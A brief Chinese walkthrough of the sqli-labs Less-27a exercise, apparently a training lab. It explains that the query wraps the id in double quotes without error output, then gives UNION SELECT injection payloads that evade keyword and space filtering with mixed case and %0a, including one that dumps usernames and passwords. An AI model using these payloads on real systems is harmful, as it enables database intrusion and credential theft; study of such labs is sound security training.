# Less-27a （双引号变体+无报错）

## 查看分析源码

过滤函数和 Less-27 一模一样，区别就两处：

```php
$id = '"' .$id. '"';            // 双引号包裹
```

```php
// print_r(mysql_error());      // 没有报错回显
```

SQL 变成 `SELECT * FROM users WHERE id="$id"`

所以 payload 把单引号换成双引号就行：

```
?id=-1"%0auNiOn%0asEleCt%0a1,2,3%0aor%0a"1"="1
```

## 爆数据

```
?id=-1"%0auNiOn%0asEleCt%0a1,group_concat(username,0x3a,password),3%0afrom%0ausers%0aor%0a"1"="1
```

无报错但数据正常时 username/password 还是会显示的，不是盲注
